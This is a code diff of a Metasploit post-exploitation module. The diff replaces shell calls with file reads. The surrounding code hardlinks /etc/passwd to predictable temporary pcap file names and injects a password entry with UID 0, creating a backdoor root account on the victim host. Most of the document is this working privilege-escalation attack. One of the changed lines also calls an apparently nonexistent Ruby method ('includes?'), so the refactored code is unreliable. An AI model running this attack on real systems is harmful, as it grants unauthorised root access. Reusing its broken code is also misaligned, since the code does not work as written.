@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Post
 
   def run
     print_status "Setting up the victim's /tmp dir"
-    initial_size = cmd_exec("cat /etc/passwd | wc -l")
+    initial_size = read_file("/etc/passwd").lines.count
     print_status "/etc/passwd is currently #{initial_size} lines long"
     i = 0
     j = 0
@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Post
         print_status "Linking /etc/passwd to predictable tmp files (Attempt #{j})"
         cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
       end
-      current_size = cmd_exec("cat /etc/passwd | wc -l")
+      current_size = read_file("/etc/passwd").lines.count
       if current_size == initial_size
         # PCAP is flowing
         pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Post
       i = (i+1) % 60 # increment second counter
     end
 
-    if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true")
+    if read_file("/etc/passwd").includes?("Metasploit")
       print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
       # TODO: Consider recording our now-created username and password as a valid credential here.
     else
